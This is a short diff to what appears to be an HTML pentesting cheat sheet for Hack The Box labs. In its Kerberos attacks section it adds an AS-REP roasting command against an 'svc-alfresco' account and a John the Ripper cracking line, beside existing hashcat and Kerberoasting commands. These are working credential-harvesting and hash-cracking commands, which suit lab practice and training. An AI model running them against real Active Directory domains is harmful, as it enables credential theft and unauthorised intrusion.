@@ -931,8 +931,10 @@ nxc rdp &lt;IP&gt; --screenshot</code></pre>
   <h3 id="kerberos">Kerberos Attacks</h3>
   <pre class="code"><code># AS-REP Roasting (no pre-auth accounts)
 impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -request -format hashcat -outputfile asrep.txt
+impacket-GetNPUsers htb.local/svc-alfresco -dc-ip &lt;DC_IP&gt; -no-pass
 nxc ldap &lt;DC_IP&gt; -u user -p pass --asreproast asrep.txt
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
 
 # Kerberoasting (need valid creds)
 impacket-GetUserSPNs domain.htb/user:pass -dc-ip &lt;DC_IP&gt; -request
